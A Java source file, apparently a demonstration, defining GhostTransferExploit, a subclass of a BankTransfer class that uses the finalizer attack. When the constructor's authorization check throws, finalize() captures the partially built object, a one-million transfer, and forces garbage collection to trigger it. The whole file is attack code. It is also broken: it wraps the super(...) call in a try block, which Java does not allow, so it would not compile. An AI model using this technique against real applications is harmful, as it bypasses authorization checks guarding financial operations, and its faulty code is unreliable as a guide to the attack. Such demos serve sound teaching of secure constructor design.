/**
 * EXPLOIT: GhostTransferExploit
 * Malicious subclass that uses the Finalizer Attack to capture unauthorized
 * objects.
 */
public class GhostTransferExploit extends BankTransfer {
    public static BankTransfer capturedGhost;

    public GhostTransferExploit(String memo, int amount) {
        try {
            // This will throw SecurityException if not authorized
            super(memo, amount);
        } catch (SecurityException e) {
            System.out.println("Exploit: Caught expected SecurityException. Finalizer will do the work...");
            // The object still exists in memory and finalize() will be called eventually.
        }
    }

    /**
     * The finalize method is called by the JVM before garbage collecting the
     * object.
     * Even if the constructor failed, finalize() is still invoked.
     */
    @Override
    protected void finalize() {
        System.out.println("Exploit: finalize() called! Capturing the 'Ghost' object...");
        // Capturing the reference to the partially initialized object!
        capturedGhost = this;
    }

    @SuppressWarnings("deprecation")
    public static void runAttack() {
        new GhostTransferExploit("GHOST-FUNDS", 1000000);

        // Triggering GC to call finalize()
        System.out.println("Exploit: Triggering Garbage Collection...");
        System.gc();
        System.runFinalization();

        // Give GC a moment
        try {
            Thread.sleep(200);
        } catch (InterruptedException e) {
        }
    }
}
